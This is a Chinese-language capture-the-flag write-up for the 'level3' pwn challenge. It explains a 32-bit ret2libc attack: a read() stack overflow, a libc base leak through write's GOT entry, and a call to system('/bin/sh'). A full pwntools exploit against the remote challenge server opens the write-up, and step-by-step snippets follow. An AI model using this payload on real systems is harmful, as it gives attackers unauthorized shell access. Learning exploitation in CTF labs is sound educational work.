先附上exp:

```python
from pwn import *
context.log_level = "debug"
p = remote('61.147.171.105','54780')
libc = ELF('libc_32.so.6')
system_offset = libc.symbols['system']
binsh_offset = next(libc.search(b"/bin/sh"))
elf = ELF('level3')
write_plt = elf.plt['write']
write_got = elf.got['write']
main_addr = elf.symbols['main']

payload = b'A' * (0x88 + 4) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
p.sendlineafter("Input:\n", payload)
write_addr = u32(p.recv()[0:4])
write_offset = libc.symbols['write']
libc_addr = write_addr - write_offset
system_addr = libc_addr + system_offset
binsh_addr = libc_addr + binsh_offset
payload = b"A"*(0x88+4) + p32(system_addr) + b"A"*4 + p32(binsh_addr)
p.sendline(payload)

p.interactive()
```

背景介绍（全靠chatgpt）

`libc_32.so.6` 是一个 Linux 系统下的动态链接库文件，通常被称为 C 库或 libc。

在 Linux 系统中，`libc` 是一个非常重要的库，提供了许多与系统函数和标准 C 函数相关的功能和符号。它包含了大量的函数和符号，用于处理字符串、内存分配、文件 I/O、进程管理、网络通信等等。这些函数和符号是在编译和链接程序时使用的。

`libc_32.so.6` 是针对 32 位的 Linux 系统的 C 库文件。它的命名约定是 `libc_32.so.X`，其中 `X` 是一个特定的版本号，用于区分不同的 libc 版本。这个库文件通常位于系统的共享库目录中，例如 `/lib` 或 `/usr/lib`。

就是相当于把一个库打包过来了，然后调用的时候会从里面找相应的函数进行调用

反编译源码如下

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  write(1, "Hello, World!\n", 0xEu);
  return 0;
}
 
ssize_t vulnerable_function()
{
  char buf; // [esp+0h] [ebp-88h]
 
  write(1, "Input:\n", 7u);
  return read(0, &buf, 0x100u);
}
```

这里的read是溢出点

先找出libc文件中的system和/bin/sh的偏移地址

```python
libc = ELF("libc_32.so.6")
 
system_offset = libc.symbols['system']
binsh_offset = libc.search('/bin/sh').next()
```

这里libc的so文件是作为动态库载入的，所以在偏移地址的基础上，还需要找到库的基地址，这里我们用write函数获取基地址

```python
elf = ELF("level3")
 
write_plt = elf.plt["write"]
write_got = elf.got["write"]
main_addr = elf.symbols["main"]
 
payload = "A"*(0x88+4) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
```

获取了write函数的PLT地址和GOT地址还有main地址

这里构造语句

```c
write(1, write_got, 4)
```

即可获得wirte_got的地址，即可算出来libc库的基地址

```c
write_addr = u32(cmd_remote.recv()[0:4])
write_offset = libc.symbols["write"]
libc_addr = write_addr - write_offset
system_addr = libc_addr + system_offset
binsh_addr = libc_addr + binsh_offset
```

然后即可用ROP获取flag